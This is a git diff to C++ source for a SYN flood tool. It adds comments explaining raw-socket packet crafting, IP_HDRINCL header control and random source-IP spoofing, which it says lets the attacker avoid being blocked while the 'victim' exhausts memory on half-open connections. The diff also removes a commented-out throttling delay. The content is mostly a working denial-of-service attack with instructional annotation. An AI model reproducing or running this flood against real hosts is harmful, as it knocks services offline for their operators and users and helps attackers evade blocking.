@@ -22,10 +22,19 @@ unsigned short SYN::checksum(void* data, int len) {
     return ~sum;
 }
 
+/*
+The Goal: Exhaust the Victim's resources (RAM/CPU). 
+The Challenge: Creating valid TCP/IP packets that look
+like they come from random places, so the victim can't block us.
+*/
+
 // SYN flood function
 void SYN::syn_flood(const char* target_ip, int target_port, int packet_count){
 
     // Create a raw socket to send TCP packets
+    // AF_INET: We're on layer 3, the OS usually builds the IP header for us
+    // SOCK_RAW: We want to build the entire packet ourselves
+    // IPPROTO_TCP: We will be building TCP packets
     int sock = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
     if (sock < 0) {
         perror("Socket creation failed");
@@ -34,6 +43,8 @@ void SYN::syn_flood(const char* target_ip, int target_port, int packet_count){
 
     // Enable IP header inclusion
     int one = 1;
+    // IP_HDRINCL: Manual override, we tell the OS we will provide the IP header
+    // ourselves so it doesnt add our real IP in the source field.
     setsockopt(sock, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one));
 
     // Target address structure
@@ -52,6 +63,9 @@ void SYN::syn_flood(const char* target_ip, int target_port, int packet_count){
     for (int i = 0; i < packet_count; i++) {
         // Generate a random source IP (spoofing)
         std::string spoofed_ip = "192.168.1." + std::to_string(rand() % 255);
+        // saddr: core of the attack, we put a random fake IP in the source field
+        // the victim sends a reply to a ghost, and waits for an ACK that never comes
+        // thus wasting memory (TCB - Transmission Control Block) on half-open connections
         inet_pton(AF_INET, spoofed_ip.c_str(), &ip->saddr);
         
         // Fill in IP header fields
@@ -72,16 +86,14 @@ void SYN::syn_flood(const char* target_ip, int target_port, int packet_count){
         tcp->seq = rand();  // Random sequence number
         tcp->ack_seq = 0;  // No acknowledgment
         tcp->doff = 5;  // Data offset (header size)
-        tcp->syn = 1;  // SYN flag set
-        tcp->window = htons(65535);  // Window size
+        tcp->syn = 1;  // SYN flag set, initiating connection
+        tcp->window = htons(65535);  // Tell the victim to accept large packets of 65535 bytes
         tcp->check = 0;  // Checksum will be calculated later
 
         // Send the SYN packet
         if (sendto(sock, packet, sizeof(packet), 0, (sockaddr*)&target_addr, sizeof(target_addr)) < 0) {
             perror("Failed to send packet");
         }
-
-        //usleep(100);  // Small delay to avoid overwhelming the system
     }
 
     close(sock);  // Close the socket after sending packets
